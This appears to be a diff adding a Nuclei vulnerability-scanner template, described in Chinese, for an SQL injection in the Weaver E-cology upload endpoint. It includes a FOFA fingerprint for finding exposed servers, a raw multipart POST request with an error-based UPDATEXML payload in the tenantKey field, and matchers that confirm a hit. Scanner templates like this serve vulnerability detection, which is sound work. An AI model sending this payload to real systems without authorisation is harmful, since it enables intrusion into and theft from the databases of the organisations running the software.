@@ -1,0 +1,47 @@
+id: weaver-e-cology-upload-sql-injection
+
+info:
+  name: "泛微E-cology upload组件SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1619753057"
+
+    该漏洞存在于泛微E-cology系统中，攻击者可通过构造特定的恶意请求利用upload组件中的SQL注入缺陷，从而获取数据库敏感信息或执行任意SQL命令。
+  tags: Weaver,E-cology
+
+http:
+- raw:
+  - |
+    POST /papi/file/module/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cache-Control: max-age=0
+    Cookie: language=zh-cn; language=zh-cn
+
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+    Content-Disposition: form-data; name="module"
+
+    sp
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+    Content-Disposition: form-data; name="tenantKey"
+
+    ' AND UPDATEXML(1,concat('~',md5(123),'~'),1)#
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+    Content-Disposition: form-data; name="file"; filename="test.txt"
+    Content-Type: text/plain
+
+    szgfbtojfpzadjpps
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'XPATH syntax error:'
+      - '202cb962a'
+    condition: and
